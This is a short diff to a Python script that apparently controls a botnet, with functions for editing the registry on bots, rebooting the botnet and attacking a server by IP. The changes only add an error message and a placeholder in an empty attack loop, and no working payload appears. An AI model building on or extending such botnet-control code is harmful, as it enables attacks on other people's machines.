@@ -201,6 +201,8 @@ def edit_registry():
             pass
         elif(resp == "FAILED"):
             print("[*] Failed to edit registry on %s"%(bot))
+        else:
+            print("[*]An unknown error occurred on %s"%(bot))
 
 def reboot_botnet():
     global botnet,payload_name
@@ -251,7 +253,7 @@ def process_shell(cmd):
 def attack_server(ip):
     global botnet
     for bot in botnet:
-
+        pass
 
 def process_cmd(cmd):
         global botnet
